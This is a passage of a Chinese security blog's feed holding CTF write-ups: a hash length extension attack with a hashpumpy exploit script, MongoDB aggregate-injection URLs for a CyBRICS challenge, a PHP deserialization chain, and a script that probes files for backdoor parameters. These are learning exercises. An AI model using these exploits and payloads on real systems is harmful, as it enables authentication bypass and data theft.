      <category term="config" scheme="https://prontosil.club/categories/config/"/>
    
    
      <category term="Windows" scheme="https://prontosil.club/tags/Windows/"/>
    
      <category term="资源管理器" scheme="https://prontosil.club/tags/%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>初见哈希扩展攻击</title>
    <link href="https://prontosil.club/2019/08/05/%E5%88%9D%E8%A7%81%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>https://prontosil.club/2019/08/05/初见哈希扩展攻击/</id>
    <published>2019-08-05T12:05:49.000Z</published>
    <updated>2019-08-05T12:33:57.202Z</updated>
    
    <content type="html"><![CDATA[<p>目前还是太菜了，向师傅们好好学习</p><h2 id="SSRF-me"><a href="#SSRF-me" class="headerlink" title="SSRF me"></a>SSRF me</h2><p>点开首页就是一长串代码, curl重定向保存到文件中,然后仔细分析了一下<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/index.py" target="_blank" rel="noopener">代码</a></p><p>程序主要涉及到三个参数,一个是param在get中,另外两个action和sign是通过cookie获得的<br>访问<code>/geneSign</code>可以得到sign的值, action可以是<code>scan</code>或<code>read</code>,但是在访问<code>/De1ctf</code>时,会检验sign是否正确,sign的生成算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>这其中<code>secret_key</code>是不知道的,并且<code>gengeSign</code>限制了action只能是<code>scan</code>,结合后来题目的提示是访问<code>flag.txt</code>,但是最多将这个文件读入<code>result.txt</code>,却不能读取出来。</p><p>这样想来是不是只能爆破<code>secret_key</code>了？但是<code>secret_key</code>又怎么会那么容易给你呢。。</p><p>这就涉及到我的知识盲区了,叫做哈希扩展攻击。。</p><p>先看实验吧一道例题</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba0.png" alt=""></p><p>这题，注入不想注入，源码没扫出来，啥信息都没有？</p><p>还是要多关注抓包的信息，尤其是数据包中出现了一些你都没有看过的东西的时候就要仔细看一看了</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba1.png" alt=""></p><p>hhh没想到吧</p><p>原来可以通过这种方式获取到源代码。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>empty函数 非空返回false，别想多了</p></blockquote><p>关键在这里：<br> <code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p><p> 其中<code>$secret</code>是不知道的，<code>$username</code>和<code>password</code>是可以控制的，并且<code>$secret</code>的长度是15</p><p>哈希扩展攻击的原理之后再讨论，我们先分析这题咋搞</p><p>首先username必须是admin,password不能是admin那就随便输一个值比如cck</p><p>我们的目标很简单，就是绕过它<br> <code>if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {</code></p><p>所以目标就是让<code>$COOKIE[&quot;getmein&quot;]</code>和md5后的值相等，所以需要同时伪造两边的值天平才能平衡</p><p>而hashpump工具就是来干这个的：<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba2.png" alt=""></p><p>第一个参数是<code>md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))</code>的值，第二个参数是填充的数据，第三个参数是填充数据加key的长度，第四个参数是添加的数据。<br>这样就能同时生成天平左边和右边的值了</p><p>当然还需要URL编码一下</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba4.png" alt=""></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba3.png" alt=""></p><p>理解了这题那么这道De1ctf的题目也就好说了</p><p>参考ctftime上的exp代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,hashpumpy,urllib</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Arguments:</span></span><br><span class="line"><span class="string">    hexdigest(str):      Hex-encoded result of hashing key + original_data.</span></span><br><span class="line"><span class="string">    original_data(str):  Known data used to get the hash result hexdigest.</span></span><br><span class="line"><span class="string">    data_to_add(str):    Data to append</span></span><br><span class="line"><span class="string">    key_length(int):     Length of unknown data prepended to the hash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">    A tuple containing the new hex digest and the new message.</span></span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload = <span class="string">'flag.txt'</span></span><br><span class="line">param = <span class="string">'param='</span> + payload</span><br><span class="line">base_url = <span class="string">'http://139.180.128.86/'</span></span><br><span class="line">signurl = base_url + <span class="string">'geneSign?'</span> + param</span><br><span class="line">r = requests.post(url=signurl,cookies=&#123;<span class="string">'action'</span>:<span class="string">'scan'</span>&#125;)</span><br><span class="line">sign = r.content</span><br><span class="line">print(sign)</span><br><span class="line">readsign,add_data = hashpumpy.hashpump(sign,payload+<span class="string">'scan'</span>,<span class="string">'read'</span>,<span class="number">16</span>)</span><br><span class="line">print(readsign)</span><br><span class="line"><span class="comment"># print add_data</span></span><br><span class="line">add_data = add_data[len(payload):]</span><br><span class="line">print(add_data)</span><br><span class="line">expurl = base_url + <span class="string">'De1ta?'</span> + param</span><br><span class="line">print(urllib.parse.quote(add_data))</span><br><span class="line">r = requests.post(url=expurl,cookies=&#123;<span class="string">'action'</span>:urllib.parse.quote(add_data),<span class="string">'sign'</span>:readsign&#125;)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure><p>当然我用的是python3，并且注意<code>urllib.parse.quote(add_data)</code>方法</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/shiyanba5.png" alt=""></p><p>就成功了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;目前还是太菜了，向师傅们好好学习&lt;/p&gt;
&lt;h2 id=&quot;SSRF-me&quot;&gt;&lt;a href=&quot;#SSRF-me&quot; class=&quot;headerlink&quot; title=&quot;SSRF me&quot;&gt;&lt;/a&gt;SSRF me&lt;/h2&gt;&lt;p&gt;点开首页就是一长串代码, curl重定向保存到文件中
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="De1ctf" scheme="https://prontosil.club/tags/De1ctf/"/>
    
      <category term="hash" scheme="https://prontosil.club/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title>noSQL Injection</title>
    <link href="https://prontosil.club/2019/08/04/noSQL-Injection/"/>
    <id>https://prontosil.club/2019/08/04/noSQL-Injection/</id>
    <published>2019-08-04T08:23:29.000Z</published>
    <updated>2019-08-04T08:53:19.643Z</updated>
    
    <content type="html"><![CDATA[<p>这道题是cybrics的一道web题，由于是第一次接触noSQL注入，所以单独拿出来好好研究一下</p><p>php操作mongodb的语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connect to mongodb</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();</span><br><span class="line"><span class="comment">// select a database</span></span><br><span class="line">$db = $m-&gt;test;</span><br><span class="line"><span class="comment">// select collection</span></span><br><span class="line">$collection = $db-&gt;users;</span><br><span class="line"></span><br><span class="line">$cursor = $collection-&gt;find($data);</span><br><span class="line">$cursor = $collection-&gt;findone($data);</span><br></pre></td></tr></table></figure><p>基本上就是实例化对象，选择数据库，选择表，然后开始查找</p><p>查询语法主要如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.user.find(&#123;<span class="string">'username'</span>: <span class="string">'xxxppp'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找用户名不为admin且password为123456的用户</span></span><br><span class="line">db.user.find(&#123;<span class="string">'username'</span>:&#123;$ne:<span class="string">'admin'</span>&#125;, <span class="string">'password'</span>:<span class="string">'123456'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//正则匹配：</span></span><br><span class="line"></span><br><span class="line">db.customer.find(&#123;<span class="string">'name'</span>: &#123;<span class="string">'$regex'</span>:<span class="string">'.*s.*'</span>&#125; &#125;)</span><br><span class="line">db.user.find(&#123;<span class="string">'username'</span>:/jrx/i&#125;)</span><br></pre></td></tr></table></figure><p>这道题目首先可以用<code>dirsearch</code>发现是git源码泄露，之后用<code>GitHacker.py</code>获取到源码</p><p>查看<code>index.php</code>，首先要登陆，需要绕过<code>auth</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>username</code>和<code>password</code>都没有经过过滤就拼接了，但是这里有一个<code>json_decode</code>不太好过</p><p>如果没有<code>json_decode</code>函数，我们可以通过<code>{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}</code>绕过登陆的限制</p><p>于是这样做：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql0.png" alt=""></p><p>这样就绕过限制登陆了</p><p>来看第二个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">    $pipeline = [</span><br><span class="line">        [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">        [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">        [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $filters = [</span><br><span class="line">        [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>array_merge</code>函数将<code>$pipeline</code>和<code>filters</code>进行合并</p><p>查找资料得知</p><blockquote><p>在mongodb的aggregate中，可以使用$cond进行条件语句：</p></blockquote><p>并且：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/noSql1.png" alt=""></p><p>我们可以构造如下链接，匹配到<code>flag</code>时将其移除</p><p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category</code></p><blockquote><p>利用条件语句，发现flags时，就输出其title：</p></blockquote><p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category</code></p><p>从title中我们得知有text，那么读取：</p><p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category</code></p><p>就可以获得flag了</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql2.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.szfszf.top/tech/nosql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93mongodb/#MongoDB" target="_blank" rel="noopener">NoSQL注入总结(MongoDB)</a></p><p><a href="https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/" target="_blank" rel="noopener">019 CyBRICS CTF Quals wp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这道题是cybrics的一道web题，由于是第一次接触noSQL注入，所以单独拿出来好好研究一下&lt;/p&gt;
&lt;p&gt;php操作mongodb的语法：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="cybrics" scheme="https://prontosil.club/tags/cybrics/"/>
    
      <category term="NoSQL" scheme="https://prontosil.club/tags/NoSQL/"/>
    
  </entry>
  
  <entry>
    <title>qwb复现</title>
    <link href="https://prontosil.club/2019/08/03/qwb%E5%A4%8D%E7%8E%B0/"/>
    <id>https://prontosil.club/2019/08/03/qwb复现/</id>
    <published>2019-08-03T14:23:50.000Z</published>
    <updated>2019-08-04T06:01:55.712Z</updated>
    
    <content type="html"><![CDATA[<p>复现一些qwb的题目</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>可以通过dirsearch找到泄露的源码 ， -u指定url， -e指定插件<br>如果是代码审计题，而且是文件很多的，需要找到利用点，我们直接搜索<code>unserialize</code>找到一处可以利用的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">       $profile=cookie(<span class="string">'user'</span>);  <span class="comment">//获取到cookie中的user值</span></span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile)); <span class="comment">//直接反序列化</span></span><br><span class="line">           <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">           <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>接下来去寻找哪里调用了这个方法，在Profile这个类中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">         <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">             $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">             <span class="keyword">exit</span>();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure></p><p><code>upload_img方法</code>会调用<code>login_check</code>反序列化</p><blockquote><p>而这个操作中的 \$this-&gt;ext、\$this-&gt;filename_tmp、$this-&gt;filename 均可通过反序列化控制。</p></blockquote><p>同时在<code>Profile.php</code>文件的末尾还有一处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个函数的意思是如果访问了类中的<code>private</code>属性，就会调用<code>__get</code>方法，如果调用了类中不存在的方法，就会通过<code>__call</code>对<code>$this-&gt;name</code>所指向的方法进行调用</p><p>意味着我们可以调用任意的类方法</p><p>同时在<code>Register.php</code>中有一处：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先上传一个图片马，之后通过<code>Register</code>类的<code>__destruct</code>方法，调用<code>__get</code>方法得到函数名<code>upload_img</code>，再调用<code>__call</code>方法，通过调用<code>upload_img</code>可以对图片马进行改名</p><p>如果我们将<code>$this-&gt;checker</code>赋值为<code>Profile</code>类，由于<code>Profile</code>类中不存在<code>index</code>方法，就会触发<code>__call</code>，这样就能构造一条完成的攻击链</p><h2 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/var/www/html/src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="string">'uname'</span></span><br><span class="line">            flag = <span class="string">'Linux'</span></span><br><span class="line">            <span class="comment"># command = 'phpinfo();'</span></span><br><span class="line">            <span class="comment"># flag = 'phpinfo'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.get(url=<span class="string">'http://127.0.0.1:8888/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.post(url=<span class="string">'http://127.0.0.1:8888/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复现一些qwb的题目&lt;/p&gt;
&lt;h2 id=&quot;upload&quot;&gt;&lt;a href=&quot;#upload&quot; class=&quot;headerlink&quot; title=&quot;upload&quot;&gt;&lt;/a&gt;upload&lt;/h2&gt;&lt;p&gt;可以通过dirsearch找到泄露的源码 ， -u指定url， -e指定
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="web" scheme="https://prontosil.club/tags/web/"/>
    
      <category term="thinkphp" scheme="https://prontosil.club/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>DIR-823G复现</title>
    <link href="https://prontosil.club/2019/08/03/DIR-823G%E5%A4%8D%E7%8E%B0/"/>
    <id>https://prontosil.club/2019/08/03/DIR-823G复现/</id>
    <published>2019-08-03T10:05:40.000Z</published>
    <updated>2019-08-03T10:07:13.522Z</updated>
    
